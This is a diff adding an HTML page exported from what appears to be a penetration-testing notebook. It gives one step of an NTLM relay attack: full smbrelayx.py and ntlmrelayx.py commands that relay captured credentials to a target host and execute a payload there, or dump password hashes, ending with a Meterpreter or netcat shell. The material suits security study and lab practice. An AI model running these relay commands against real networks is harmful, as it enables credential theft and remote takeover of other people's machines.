@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>4. start the script smbrelayx OR ntlmrelayx</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>4. start the script smbrelayx OR ntlmrelayx</h1><br/><br /><strong>Smbrelayx.py</strong><br />Now that we have set everything with the previously steps we can run smbrelayx.py:<br /><div class="codebox"><pre>python3 <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>impacket<span style="color:#ff9d00;font-weight:700">/</span>examples<span style="color:#ff9d00;font-weight:700">/</span>smbrelayx.py -h &lt;TargerIP_Server&gt; -e <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>stduser<span style="color:#ff9d00;font-weight:700">/</span>smbexp.exe</pre></div><br />    <strong>-h &lt;TargerIP_Server&gt;</strong> → Host to relay the credentials to, if not it will relay it back to the client<br />    <strong>-e &lt;file&gt;</strong> → File to execute on the target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)<br />    <a href=""><img src="images/818-1.png" alt="images/818-1.png" /></a><br />    <br /><strong>Ntlmrelayx.py</strong><br /><div class="codebox"><pre>python3 <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>doc<span style="color:#ff9d00;font-weight:700">/</span>python3-impacket<span style="color:#ff9d00;font-weight:700">/</span>examples<span style="color:#ff9d00;font-weight:700">/</span>ntlmrelayx.py -t 172.16.23.100 -smb2support -e smbexp.exe</pre></div><br />    <a href=""><img src="images/818-2.png" alt="images/818-2.png" /></a><br />    <br /><br /><br />Now we should have got a Meterpreter shell<br />    <a href=""><img src="images/818-3.png" alt="images/818-3.png" /></a><br /><br />or a netcat shell<br />    <a href=""><img src="images/818-4.png" alt="images/818-4.png" /></a><br /><br />Now that we have got the shells we can close the Respnder and the Relay (ntlmrelayx or smbrelayx</div>
+</body>
+</html>
